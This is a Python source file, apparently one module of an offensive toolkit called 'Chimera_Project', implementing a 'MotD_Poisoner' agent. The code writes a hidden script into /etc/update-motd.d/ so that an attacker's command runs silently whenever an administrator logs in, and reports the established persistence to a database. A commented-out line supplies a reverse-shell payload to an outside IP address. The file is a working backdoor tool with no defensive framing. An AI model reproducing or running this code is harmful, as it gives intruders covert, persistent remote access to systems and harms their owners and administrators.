import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import logging

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class MotD_Poisoner:
    def __init__(self):
        self.agent_id = "58"
        self.name = "MotD_Poisoner"
        self.db = ChimeraDB()
        
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(self.name)

    def poison(self, backdoor_cmd):
        """Hides a command in the Linux MotD update sequence."""
        target_path = "/etc/update-motd.d/99-system-check"
        
        script_content = f"#!/bin/bash\n{backdoor_cmd} > /dev/null 2>&1 &"
        
        try:
            # You need root/sudo for this, which we'd get from Agent 43 or 55
            with open(target_path, 'w') as f:
                f.write(script_content)
            os.chmod(target_path, 0o755) # Make it executable
            
            self.logger.warning("[!!!] MotD POISONED. Waiting for Admin login...")
            self.db.report_finding(self.name, "Persistence_Established", {
                "method": "MotD_Poisoning",
                "path": target_path
            })
        except Exception as e:
            self.logger.error(f"Poisoning failed: {e}")

    def run(self):
        self.db.heartbeat(self.name)
        # self.poison("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1")
        self.db.close()

if __name__ == "__main__":
    agent = MotD_Poisoner()
    agent.run()
